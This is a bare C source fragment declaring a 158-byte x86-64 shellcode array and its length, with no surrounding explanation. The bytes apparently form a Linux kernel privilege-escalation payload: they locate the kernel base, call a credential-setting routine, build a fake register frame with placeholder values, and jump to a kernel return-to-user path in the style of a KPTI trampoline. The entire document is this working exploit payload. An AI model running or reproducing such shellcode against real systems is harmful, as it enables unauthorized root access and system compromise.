unsigned char shellcode[] = {
  0xf3, 0x0f, 0x1e, 0xfa, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x5f, 0x49,
  0x81, 0xef, 0x19, 0xbe, 0x1b, 0x01, 0x49, 0x8d, 0xbf, 0x80, 0x90, 0xe3,
  0x01, 0x49, 0x8d, 0x87, 0x10, 0x72, 0x09, 0x01, 0xff, 0xd0, 0x31, 0xc0,
  0x48, 0x89, 0x04, 0x24, 0x48, 0x89, 0x44, 0x24, 0x08, 0x48, 0x89, 0x44,
  0x24, 0x10, 0x48, 0x89, 0x44, 0x24, 0x18, 0x48, 0x89, 0x44, 0x24, 0x20,
  0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x89,
  0x44, 0x24, 0x40, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x89, 0x44, 0x24,
  0x50, 0x48, 0x89, 0x44, 0x24, 0x60, 0x48, 0x89, 0x44, 0x24, 0x68, 0x48,
  0x89, 0x44, 0x24, 0x70, 0x48, 0xb8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,
  0x22, 0x22, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0xb8, 0x44, 0x44, 0x44,
  0x44, 0x44, 0x44, 0x44, 0x44, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0xb8,
  0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x48, 0x89, 0x84, 0x24,
  0x98, 0x00, 0x00, 0x00, 0x49, 0x8d, 0x87, 0xaf, 0x01, 0x80, 0x01, 0xff,
  0xe0, 0xcc
};
unsigned int shellcode_len = 158;